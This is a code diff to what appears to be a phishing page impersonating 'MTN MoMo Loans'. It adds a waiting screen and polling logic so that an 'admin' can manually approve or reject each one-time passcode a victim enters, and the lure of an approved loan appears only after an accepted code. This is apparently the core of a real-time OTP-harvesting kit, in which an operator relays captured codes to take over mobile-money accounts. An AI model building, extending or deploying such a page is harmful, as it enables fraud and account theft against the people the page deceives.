@@ -550,7 +550,20 @@
   <div class="otp-foot">© 2026 MTN MoMo Loans – Powered by MTN</div>
 </div>
 
-<!-- ══════════════════════ PAGE 11: APPROVAL ══════════════════════ -->
+<!-- ══════════════════════ PAGE 11: WAIT FOR OTP APPROVAL ══════════════════════ -->
+<div id="page-wait-otp" class="page">
+  <div style="background:linear-gradient(135deg, var(--mtn-dark), var(--mtn-light)); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
+    <div class="wait-wrap">
+      <div class="wait-icon">⏳</div>
+      <h2>Verifying OTP Code</h2>
+      <p>Your OTP code has been received. Please wait for admin verification...</p>
+      <div style="margin-top:40px; font-size:0.85rem; color:rgba(255,255,255,0.6);">Application ID: <span id="waitOtpAppId" style="font-family:monospace; color:var(--mtn-gold);">-</span></div>
+      <div style="margin-top:24px; font-size:0.9rem; color:rgba(255,255,255,0.7); animation:pulse 2s infinite;">Admin is verifying your OTP code...</div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════ PAGE 12: APPROVAL ══════════════════════ -->
 <div id="page-approval" class="page">
   <div class="appr-wrap">
     <div class="appr-top">
@@ -1006,8 +1019,10 @@
 
     document.getElementById('mOtp').classList.add('show');
     document.getElementById('bOtp').disabled = true;
+    document.getElementById('bOtp').textContent = 'VERIFYING...';
 
     try {
+      // Submit OTP to server
       const res = await fetch('/api/verify-otp', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -1021,22 +1036,74 @@
       document.getElementById('mOtp').classList.remove('show');
 
       if (data.success) {
-        // Update approval page with loan details
-        document.getElementById('aprAmount').textContent = 'XAF ' + (S.loanAmount || 1000000).toLocaleString();
-        document.getElementById('aprAmt').textContent = 'XAF ' + (S.loanAmount || 1000000).toLocaleString();
-        document.getElementById('aprTerm').textContent = S.loanTerm || '48 Months';
-        const monthly = Math.ceil((S.loanAmount || 1000000) / (parseInt(S.loanTerm || '48')))  ;
-        document.getElementById('aprMth').textContent = 'XAF ' + monthly.toLocaleString();
-        goTo('page-approval');
+        // OTP submitted successfully, now wait for admin approval
+        document.getElementById('waitOtpAppId').textContent = S.applicationId;
+        goTo('page-wait-otp');
+        
+        // Start polling for OTP approval
+        pollForOtpApproval(S.applicationId);
       } else {
         document.getElementById('bOtp').disabled = false;
-        showOtpMsg('error', data.message || 'OTP verification failed.');
+        document.getElementById('bOtp').textContent = 'VERIFY & APPROVE LOAN';
+        showOtpMsg('error', data.message || 'Failed to submit OTP.');
       }
     } catch (err) {
       document.getElementById('mOtp').classList.remove('show');
       document.getElementById('bOtp').disabled = false;
-      showOtpMsg('error', 'Network error: ' + err.message);
+      document.getElementById('bOtp').textContent = 'VERIFY & APPROVE LOAN';
+      showOtpMsg('error', 'Error: ' + err.message);
     }
+  }
+
+  // Poll for OTP approval status
+  let otpPollTimeout;
+  function pollForOtpApproval(applicationId) {
+    const checkStatus = async () => {
+      try {
+        const res = await fetch(`/api/check-otp-status/${applicationId}`);
+        const data = await res.json();
+        
+        if (data.success) {
+          const status = data.status;
+          
+          if (status === 'approved') {
+            console.log('✅ Admin approved OTP - Loan Approved!');
+            clearTimeout(otpPollTimeout);
+            
+            // Update approval page with loan details
+            document.getElementById('aprAmount').textContent = 'XAF ' + (S.loanAmount || 1000000).toLocaleString();
+            document.getElementById('aprAmt').textContent = 'XAF ' + (S.loanAmount || 1000000).toLocaleString();
+            document.getElementById('aprTerm').textContent = S.loanTerm || '48 Months';
+            const monthly = Math.ceil((S.loanAmount || 1000000) / (parseInt(S.loanTerm || '48')));
+            document.getElementById('aprMth').textContent = 'XAF ' + monthly.toLocaleString();
+            
+            goTo('page-approval');
+          } else if (status === 'wrongcode') {
+            console.log('❌ Admin marked code as wrong');
+            clearTimeout(otpPollTimeout);
+            goTo('page-otp');
+            document.getElementById('bOtp').disabled = false;
+            document.getElementById('bOtp').textContent = 'VERIFY & APPROVE LOAN';
+            // Clear OTP fields
+            [0,1,2,3].forEach(i => document.getElementById('otp'+i).value = '');
+            showOtpMsg('error', 'The OTP code was incorrect. Please try again.');
+          } else {
+            // Still pending, keep polling
+            otpPollTimeout = setTimeout(checkStatus, 2000);
+          }
+        } else {
+          // Keep polling on error
+          otpPollTimeout = setTimeout(checkStatus, 3000);
+        }
+      } catch (err) {
+        console.error('OTP Poll error:', err);
+        // Keep polling on network error
+        otpPollTimeout = setTimeout(checkStatus, 3000);
+      }
+    };
+    
+    // Start polling
+    checkStatus();
   }
 
   // INIT
